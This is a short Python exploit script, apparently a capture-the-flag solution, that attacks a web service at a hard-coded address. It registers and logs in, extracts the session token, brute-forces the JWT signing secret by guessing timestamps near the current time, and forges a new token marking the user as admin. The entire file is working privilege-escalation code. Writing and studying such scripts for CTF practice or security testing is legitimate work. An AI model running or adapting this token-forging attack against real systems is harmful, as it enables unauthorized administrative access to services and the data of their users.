import base64
import json
import time

import jwt
import requests

key = str(time.time())[0:10]
target = "http://1.95.87.193:36183"
requests.post(url=target + "/register",
              json={
                  "username": "aaa",
                  "password": "123456"
              })
token = requests.post(url=target + "/login",
                      json={
                          "username": "aaa",
                          "password": "123456"
                      }).headers["Set-Cookie"].split("Token=")[1]
jwtdata = (json.loads(base64.b64decode(token))["secret"])
print(int(key))
for i in range(int(key) - 2000, int(key) + 2000):
    try:

        print(jwt.decode(jwtdata, str(i), algorithms='HS256'))
        key = str(i)
    except:
        pass
secret = {"name": "aaa", "is_admin": "1"}
verify_c = jwt.encode(secret, key, algorithm='HS256')
infor = {"name": "aaa", "secret": verify_c}
token = base64.b64encode(json.dumps(infor).encode()).decode()
print(token)
